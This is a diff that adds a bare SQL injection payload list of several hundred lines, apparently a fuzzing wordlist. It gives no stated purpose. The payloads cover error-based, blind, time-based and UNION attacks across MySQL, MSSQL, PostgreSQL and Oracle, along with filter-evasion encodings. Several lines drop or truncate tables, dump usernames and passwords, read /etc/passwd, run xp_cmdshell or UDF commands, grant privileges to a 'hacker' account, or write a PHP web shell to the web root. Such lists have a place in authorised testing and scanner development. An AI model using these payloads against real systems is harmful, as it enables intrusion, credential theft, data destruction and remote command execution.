@@ -1,0 +1,398 @@
+1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--
+1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--
+1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT user()),0x7e,FLOOR(RAND()*2))a FROM information_schema.tables GROUP BY a)b)--
+1 AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version)),1)--
+1' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3)x WHERE 1=1 AND 1=EXTRACTVALUE(1,CONCAT(0x7e,(SELECT password FROM users LIMIT 1))))--
+1' AND (SELECT ASCII(SUBSTRING((SELECT database()),1,1)))>100--
+1' AND (SELECT LENGTH(database()))=4--
+1' AND (SELECT SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1))='a'--
+1' AND IF(1=1,SLEEP(0),SLEEP(5))--
+admin' AND (SELECT COUNT(*) FROM users)>0--
+1' AND (SELECT 1 FROM users WHERE username='admin' AND password LIKE 'a%')--
+1' AND (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))>0--
+1' AND BENCHMARK(10000000,MD5('test'))--
+1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+1' AND (SELECT IF(1=1,SLEEP(5),0))--
+1' WAITFOR DELAY '0:0:5'--
+1' AND SLEEP(5)--
+1; WAITFOR DELAY '00:00:05'--
+1' OR SLEEP(5)--
+1' AND (SELECT SLEEP(5) FROM dual WHERE 1=1)--
+1' AND pg_sleep(5)--
+1' AND (SELECT pg_sleep(5))--
+1' AND (SELECT count(*) FROM generate_series(1,10000000))--
+1' AND (SELECT 1 FROM pg_sleep(5))--
+1' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+1 UNION SELECT 1,2,3--
+1 UNION ALL SELECT NULL,NULL,NULL--
+1 UNION SELECT username,password FROM users--
+1' UNION SELECT @@version,user(),database()--
+1 UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables--
+1 UNION SELECT 1,2,3 FROM admin--
+1 UNION SELECT 1,(SELECT password FROM users LIMIT 1),3--
+1 UNION ALL SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--
+1 UNION SELECT 0x3120322033,2,3--
+1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c--
+1; DROP TABLE users--
+1'; INSERT INTO logs VALUES('test')--
+1; SELECT * FROM admin--
+1; UPDATE users SET password='hacked' WHERE id=1--
+1; DELETE FROM sessions WHERE 1=1--
+1'; EXEC xp_cmdshell('whoami')--
+1; CREATE TABLE hack(data text)--
+1'; SHOW TABLES--
+1; ALTER TABLE users DROP COLUMN password--
+1'; DROP PROCEDURE IF EXISTS proc--
+%31%27%20%4F%52%20%31%3D%31--
+%2531%2527%2520%254F%2552%2520%2531%253D%2531--
+0x3127204F52202731273D2731
+1%2F**%2FOR%2F**%2F1%3D1--
+1'+||+'1'='1
+1'+UNION%0aSELECT+1,2,3--
+1'+UNION/**/SELECT/**/1,2,3--
+1'A0ORA01=1--
+1'||'1'='1'--
+1'/*!50000OR*/1=1--
+'; WAITFOR DELAY '0:0:5'--
+1 AND SLEEP(5)
+' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+(SELECT 6993 FROM (SELECT(SLEEP(5)))ecGw)
+'; SELECT pg_sleep(5)--
+1' OR SLEEP(5)#
+'; WAITFOR DELAY '0:0:10'--
+1 AND SLEEP(5)--
+' AND SLEEP(5) AND '1'='1
+" AND SLEEP(5)--
+1; SELECT SLEEP(5)
+1' OR 1=1 AND SLEEP(5)--
+admin' OR '1'='1' AND SLEEP(5)--
+'; SELECT SLEEP(5)--
+1" AND SLEEP(5) AND "1"="1
+1 AND SLEEP(5) AND 1=1
+1' AND SLEEP(5) AND '1'='1
+1 WAITFOR DELAY '0:0:5'
+1; WAITFOR DELAY '0:0:5'
+1' OR SLEEP(5)='
+1) AND SLEEP(5)--
+1)) AND SLEEP(5)--
+1))) AND SLEEP(5)--
+1 AND SLEEP(5)=1
+1' OR '1'='1' AND SLEEP(5)--
+1 ORDER BY 1 AND SLEEP(5)
+1 GROUP BY 1 AND SLEEP(5)
+1 UNION SELECT CASE WHEN SLEEP(5) THEN 1 END
+1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
+1 OR SLEEP(5)
+1' OR SLEEP(5)# AND '1'='1
+1'+(select*1)='1
+(select * from (select sleep(5))a)
+1;select sleep(5)--
+1 and (select 1 from (select sleep(5))a)
+' AND 1=1--
+' AND 'a'='a
+1 AND 1=2
+admin' AND 1=1--
+' OR '1'='1'--
+' AND 1=2--
+" AND 1=1--
+" AND "a"="a
+1 AND 1=1
+' OR 1=1--
+" OR "1"="1
+admin' OR '1'='1--
+' OR 'x'='x
+' AND 'x'='x'--
+" OR "x"="x
+1' AND '1'='1'--
+1" AND "1"="1
+' OR 1=1#
+' OR 'a'='a'--
+1 OR 1=1
+' OR '1'='1
+" OR 1=1--
+admin' OR 1=1--
+admin' OR 'a'='a
+' OR username LIKE '%admin%'--
+' AND IF(1=1,SLEEP(0),SLEEP(0))--
+1 AND EXISTS(SELECT * FROM users)
+1 AND EXISTS(SELECT * FROM admin)
+' AND EXISTS(SELECT * FROM users WHERE 'a'='a')--
+1 AND (SELECT COUNT(*) FROM users)>0
+' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
+' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables LIMIT 1)='a'--
+1' AND 1=1 AND IF(1=1,1,1)=1
+1" AND "1"="1" AND "1"="1
+' OR (SELECT COUNT(*) FROM users)>0--
+' UNION SELECT NULL FROM admin WHERE 1=1--
+1' OR '1'='1' AND 1=1--
+1' OR '1'='2' AND 1=1--
+1" OR "1"="1" AND "1"="1--
+1" OR "1"="2" AND "1"="1--
+1 AND 1=1 AND 1=1
+1 AND 1=2 AND 1=1
+1 OR 1=1 AND 1=1
+1 OR 1=2 AND 1=1
+' UNION SELECT NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT table_name FROM information_schema.tables--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1--
+' UNION ALL SELECT NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3,4,5--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+' UNION ALL SELECT 1,2,3--
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT version(),user(),database()--
+' UNION SELECT NULL,version(),user()--
+' UNION ALL SELECT NULL,NULL FROM dual--
+' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables--
+' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns--
+' UNION SELECT NULL FROM information_schema.tables--
+' UNION ALL SELECT * FROM users--
+1 UNION SELECT NULL--
+1 UNION ALL SELECT NULL--
+1 UNION SELECT version()--
+1 UNION SELECT user()--
+1 UNION SELECT database()--
+1 UNION ALL SELECT table_name FROM information_schema.tables--
+' UNION SELECT CHAR(65),CHAR(66),CHAR(67)--
+' UNION SELECT 0x61646d696e--
+' UNION SELECT 0x73656c656374--
+' UNION ALL SELECT NULL #
+' UNION /*!50000SELECT*/ NULL--
+' UNION /*!50000ALL*/ /*!50000SELECT*/ NULL--
+' /*!50000UNION*/ /*!50000SELECT*/ NULL--
+' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3--
+' /*!UNION*/ /*!SELECT*/ NULL--
+' /*!50000UNION*/ /*!50000SELECT*/ table_name FROM information_schema.tables--
+' /*!50000UNION*/ /*!50000SELECT*/ column_name FROM information_schema.columns--
+' /*!50000UNION*/ /*!50000SELECT*/ password FROM users--
+' /*!50000UNION*/ /*!50000SELECT*/ username,password FROM users--
+' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL--
+' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL,NULL,NULL--
+' /*!50000UNION*/ /*!50000SELECT*/ version()--
+' /*!50000UNION*/ /*!50000SELECT*/ user()--
+' /*!50000UNION*/ /*!50000SELECT*/ database()--
+' /*!50000UNION*/ /*!50000SELECT*/ @@version--
+' /*!50000UNION*/ /*!50000SELECT*/ @@hostname--
+' /*!50000UNION*/ /*!50000SELECT*/ table_name FROM information_schema.tables WHERE table_schema=database()--
+' /*!50000UNION*/ /*!50000SELECT*/ column_name FROM information_schema.columns WHERE table_name='users'--
+' /*!50000UNION*/ /*!50000SELECT*/ GROUP_CONCAT(user,0x3a,password) FROM users--
+' /*!50000UNION*/ /*!50000SELECT*/ CONCAT(user,0x3a,password) FROM users--
+' /*!50000UNION*/ /*!50000SELECT*/ user FROM mysql.user--
+' /*!50000UNION*/ /*!50000SELECT*/ host,user,password FROM mysql.user--
+' /*!50000UNION*/ /*!50000SELECT*/ LOAD_FILE('/etc/passwd')--
+' /*!50000UNION*/ /*!50000SELECT*/ '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
+' /*!50000UNION*/ /*!50000SELECT*/ NULL,NULL,NULL INTO OUTFILE '/var/www/html/test.php'--
+' /*!50000UNION*/ /*!50000SELECT*/ version() INTO DUMPFILE '/tmp/version.txt'--
+' UNION SELECT NULL,NULL--
+'; SELECT @@version--
+' UNION SELECT banner FROM v$version--
+' UNION SELECT 1--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT 1,2,3--
+' UNION ALL SELECT NULL,NULL,NULL--
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT @@version,NULL--
+' UNION SELECT @@version,@@servername--
+' UNION SELECT db_name(),NULL--
+' UNION SELECT user_name(),NULL--
+' UNION SELECT name FROM sys.databases--
+' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
+' UNION SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS--
+' UNION SELECT name FROM sys.tables--
+' UNION SELECT name FROM sys.columns--
+' UNION SELECT TOP 1 name FROM sys.tables--
+' UNION SELECT TOP 1 name FROM sys.databases--
+' UNION ALL SELECT TOP 1 name FROM sys.databases--
+' EXEC xp_cmdshell 'dir'--
+'; EXEC xp_cmdshell 'type C:\windows\win.ini'--
+'; EXEC sp_executesql N'SELECT * FROM users'--
+'; EXECUTE('SELECT * FROM users')--
+' DECLARE @q VARCHAR(8000) EXEC(@q)--
+' DECLARE @q NVARCHAR(4000) EXEC(@q)--
+'; SELECT * FROM users WHERE id=1 OR 1=1--
+'; SELECT * FROM admin WHERE username='admin' AND password='admin'--
+'; WAITFOR DELAY '0:0:5'--
+'; WAITFOR DELAY '0:0:10'--
+1 AND 1=1
+1 AND 1=2
+admin'--
+admin' #
+' OR '1'='1
+' OR '1'='1'--
+' OR '1'='1' #
+' UNION SELECT NULL::text--
+'; SELECT version()--
+' UNION SELECT NULL--
+' UNION SELECT 1--
+' UNION ALL SELECT NULL--
+' UNION ALL SELECT 1,2,3--
+' UNION ALL SELECT NULL,NULL--
+' UNION SELECT version(),user()--
+' UNION SELECT current_database(),user()--
+' UNION SELECT table_name FROM information_schema.tables--
+' UNION SELECT column_name FROM information_schema.columns--
+' UNION SELECT tablename FROM pg_tables--
+' UNION SELECT attname FROM pg_attribute--
+' UNION SELECT relname FROM pg_class WHERE relkind='r'--
+' UNION SELECT usename FROM pg_user--
+' UNION SELECT passwd FROM pg_shadow--
+'; SELECT pg_ls_dir('./')--
+'; SELECT pg_read_file('/etc/passwd')--
+'; SELECT lo_import('/etc/passwd')--
+'; COPY (SELECT * FROM users) TO '/tmp/users.txt'--
+'; CREATE TABLE cmd_exec(cmd_output text)--
+'; COPY cmd_exec FROM '/etc/passwd'--
+'; SELECT * FROM cmd_exec--
+'; DROP TABLE IF EXISTS cmd_exec--
+'; SELECT lo_create(0)--
+'; SELECT loread(lo_open(0),1000)--
+'; SELECT query_to_xml('SELECT * FROM users',true,false,'')--
+1; SELECT pg_ls_dir('/etc')
+1; SELECT pg_read_file('/etc/passwd')
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,database()),1)--
+' AND extractvalue(1,concat(0x7e,user()))--
+' AND updatexml(1,concat(0x7e,@@version),1)--
+' AND extractvalue(1,concat(0x7e,@@version))--
+' AND updatexml(1,concat(0x7e,@@hostname),1)--
+' AND extractvalue(1,concat(0x7e,@@hostname))--
+' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)),1)--
+' AND extractvalue(1,concat(0x7e,(SELECT table_name FROM information_schema.tables LIMIT 1)))--
+' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 1)),1)--
+' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))--
+' AND updatexml(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users)),1)--
+' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
+' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
+' AND updatexml(1,concat(0x7e,(SELECT version())),1)--
+' AND updatexml(1,concat(0x7e,(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)),1)--
+' AND updatexml(1,concat(0x7e,(SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)),1)--
+' AND updatexml(1,concat(0x7e,(SELECT COUNT(*) FROM users)),1)--
+' AND updatexml(1,concat(0x7e,(SELECT SUBSTRING(password,1,10) FROM users WHERE id=1)),1)--
+' AND updatexml(1,concat(0x7e,(SELECT MID(password,1,10) FROM users WHERE id=1)),1)--
+1 AND extractvalue(1,concat(0x7e,version()))
+1 AND updatexml(1,concat(0x7e,database()),1)
+1 AND extractvalue(1,concat(0x7e,user()))
+1 AND updatexml(1,concat(0x7e,@@version),1)
+" AND extractvalue(1,concat(0x7e,version()))--
+" AND updatexml(1,concat(0x7e,database()),1)--
+" AND extractvalue(1,concat(0x7e,user()))--
+" AND updatexml(1,concat(0x7e,@@version),1)--
+) AND extractvalue(1,concat(0x7e,version()))--
+) AND updatexml(1,concat(0x7e,database()),1)--
+')) AND extractvalue(1,concat(0x7e,version()))--
+')) AND updatexml(1,concat(0x7e,database()),1)--
+'; DROP TABLE users--
+'; INSERT INTO admin (user,pass) VALUES ('hacker','md5hash')--
+'; DROP TABLE admins--
+'; DROP TABLE admin--
+'; DELETE FROM users WHERE id=1--
+'; DELETE FROM users--
+'; UPDATE users SET password='hacked' WHERE id=1--
+'; UPDATE users SET role='admin' WHERE username='admin'--
+'; INSERT INTO users (username,password) VALUES ('hacker','password123')--
+'; CREATE TABLE pwned(cmd_exec TEXT)--
+'; CREATE TABLE exploit(code TEXT)--
+'; DROP DATABASE test--
+'; SELECT * FROM users INTO OUTFILE '/tmp/users.txt'--
+'; SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
+'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--
+'; FLUSH PRIVILEGES--
+'; SHUTDOWN--
+'; DROP FUNCTION IF EXISTS exec--
+'; CREATE FUNCTION exec RETURNS INT SONAME 'udf.so'--
+'; SELECT exec('id')--
+'; SELECT exec('cat /etc/passwd')--
+'; SHOW TABLES--
+'; SHOW DATABASES--
+'; SHOW COLUMNS FROM users--
+'; DESCRIBE users--
+'; EXPLAIN SELECT * FROM users--
+'; INSERT INTO users (username) VALUES ('newadmin')--
+'; ALTER TABLE users ADD COLUMN backdoor TEXT--
+'; ALTER TABLE users DROP COLUMN password--
+'; TRUNCATE TABLE users--
+'; RENAME TABLE users TO hacked_users--
+'; LOCK TABLE users READ--
+'; UNLOCK TABLES--
+' AND '1'='1'; DROP TABLE users--
+' OR '1'='1'; DROP TABLE users--
+1; DROP TABLE users--
+1; DELETE FROM users WHERE 1=1--
+1; INSERT INTO users (id,username,password) VALUES (999,'hacker','pass')--
+1; UPDATE users SET password='changed' WHERE 1=1--
+1; CREATE TABLE shell(code TEXT)--
+1; SELECT * FROM users INTO OUTFILE '/var/www/html/users.txt'--
+1; SHOW TABLES--
+1; SHOW DATABASES--
+1; SHOW COLUMNS FROM users--
+1; DESCRIBE users--
+1; EXPLAIN SELECT * FROM users--
+1; GRANT ALL PRIVILEGES ON *.* TO 'admin'@'%'--
+1; FLUSH PRIVILEGES--
+0x53454c454354
+%2527
+%u0027
+%00
+/**/
+SeLeCt
+%09
+0x73656c656374
+0xUNION
+0x414243
+'/**/UNION/**/SELECT/**/NULL--
+'/**/UNION/**/SELECT/**/1,2,3--
+'/**/UNION/**/SELECT/**/NULL,NULL,NULL--
+'/**/AND/**/1=1--
+'/**/OR/**/1=1--
+'/**/AND/**/1=2--
+'/**/WHERE/**/1=1--
+' UNION/**/SELECT/**/NULL--
+' UNION/**/SELECT/**/1--
+' UNION/**/SELECT/**/1,2--
+' UNION/**/SELECT/**/1,2,3--
+'/**/UNION/**/ALL/**/SELECT/**/NULL--
+'/**/UNION/**/ALL/**/SELECT/**/1,2,3--
+'/*!50000UNION*//*!50000SELECT*/NULL--
+'/*!50000UNION*//*!50000SELECT*/1,2,3--
+'/*!UNION*//*!SELECT*/NULL--
+'/*!UNION*//*!SELECT*/1,2,3--
+'/*!50000UNION*//*!50000SELECT*//**/NULL--
+'/*!50000UNION*//*!50000SELECT*//**/1,2,3--
+%252027
+%25253c
+%252520
+%%271
+%2527 OR 1=1 --
+\u0027
+\u0022
+%c0%27
+%c0%a7
+%c0%af
+%e0%80%a7
+%f8%80%80%80
+' UNI/**/ON SEL/**/ECT NULL--
+' UN/**/ION SE/**/LECT NULL--
+' UN/*\*/ION SEL/*\*/ECT NULL--
+' UN/*!50000ION*/ SEL/*!50000ECT*/ NULL--
+' UN/**/ION/**/SELECT/**/NULL--
+' UN/*!50000*/ION SELECT NULL--
+'/**/UNION/**/SELECT/**/version()--
+'/**/UNION/**/SELECT/**/user()--
+'/**/UNION/**/SELECT/**/database()--
+'/**/UNION/**/SELECT/**/table_name/**/FROM/**/information_schema.tables--
+'/**/UNION/**/SELECT/**/column_name/**/FROM/**/information_schema.columns--
+'/**/AND/**/extractvalue(1,concat(0x7e,version()))--
+'/**/AND/**/updatexml(1,concat(0x7e,database()),1)--
+'/**/OR/**/1=1--
+'/**/AND/**/1=1--
+'/**/AND/**/1=2--
+'/**/OR/**/'a'='a'--
+admin'--
+admin'#
+admin'/*
+' OR '1'='1
+' OR '1'='1'--
